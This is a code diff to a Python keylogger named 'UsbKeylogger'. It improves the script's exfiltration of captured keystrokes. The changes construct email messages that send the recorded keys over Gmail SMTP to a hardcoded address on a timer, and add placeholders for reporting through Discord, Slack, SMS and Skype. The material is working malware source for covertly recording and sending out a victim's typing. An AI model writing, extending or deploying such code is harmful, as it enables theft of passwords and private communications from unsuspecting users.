@@ -4,6 +4,8 @@ import smtplib # Imported to provide the ability to send the recorded key logs t
 
 from threading import Timer # Intended to make it possible to send reports have a set period of time
 from datetime import datetime
+from email import message
+
 
 # Email Variables for report type of emails
 EMAIL = "ph4ntom77projects@gmail.com" # Email that reports are sent to
@@ -30,21 +32,23 @@ class UsbKeylogger:
         with open(f"{self.fileIndentifier}.txt", "w") as f: # Opens a file of the name from createFileIdentifier
             print(self.keylog, file = f) # Print the contents of a variable (self.keylog) to a file
 
-    def emailSubject(self):
-        startTime = str(self.startTimeVal).replace(" ", "_") # Creates a string variable from the start time of the keylog interval
-        endTime = str(self.endTimeVal).replace(" ", "_") # Creates a string variable from the end time of the keylog interval
-        return f"Log = {startTime} to {endTime}"
-
-    def reportEmail(self, address, password, contents):
+    def reportEmail(self, address, password, contents, subject):
         email = smtplib.SMTP(host = "smtp.gmail.com", port = 587) # Port 587 is used encrypt SMTP messages using TLS
+        msg = message.Message()
+        msg.add_header('from', address)
+        msg.add_header('to', address)
+        msg.add_header('subject', subject)
+        msg.set_payload(contents)
+
         email.starttls()
         email.login(address, password)
-        email.sendmail(address, address, contents)
+        email.send_message(msg, from_addr = address, to_addrs = [address])
         email.quit()
 
     #def reportDiscord(self):
     #def reportSkype(self):
     #def reportSlack(self):
+    #def reportText(self):
 
     def callbackKeyboard(self, event):
         eventName = event.name # Create eventName variable
@@ -64,14 +68,15 @@ class UsbKeylogger:
         if self.keylog: # Checks if self.keylong contains any data and execute the below statements if it does
             self.endTimeVal = datetime.now() # Retrieves the end datetime for utilization in file identifying
             self.createFileIdentifier() # Execute the function that creates the file id/name
-            subject = self.emailSubject # Execute the function that creates the email subject
 
             if self.reportType == "File":
                 self.reportFile() # Calls the reportFile function to create a file for keylog recording
             elif self.reportType == "Email":
-                mail = 'Subject: {}\n\n{}'.format(subject, self.keylog)
-                self.reportEmail(EMAIL, EMAIL_PW, mail) # Calls the reportEmail funciton to sends an email of keylog recording
+                #mail = 'Subject: {}\n\n{}'.format(subjectText, self.keylog)
+                self.reportEmail(EMAIL, EMAIL_PW, self.keylog, self.fileIndentifier) # Calls the reportEmail funciton to sends an email of keylog recording
+           
             self.startTimeVal = datetime.now() # Retrieves the start datetime for utilization in file identifying
+        
         self.keylog = "" # Resets the value of self.keylog to contain nothing
         logTimer = Timer(interval = self.reportInterval, function = self.reportKeyLog) # Creates a timer for the keylog and takes the specificed reportInterval as a parameter
         logTimer.daemon = True # The timer thread is now a daemon, which means that it will die off when the main thread dies
@@ -85,6 +90,13 @@ class UsbKeylogger:
 
 if __name__ == "__main__":
         usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "Email")
-        usbKeylogger.start()
         #usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "File")
+        #usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "Discord")
+        #usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "Slack")
+        #usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "SMS")
+        #usbKeylogger = UsbKeylogger(reportInterval = LOG_INTERVAL, reportType = "Skype")
+        usbKeylogger.start()
+
+
+
     
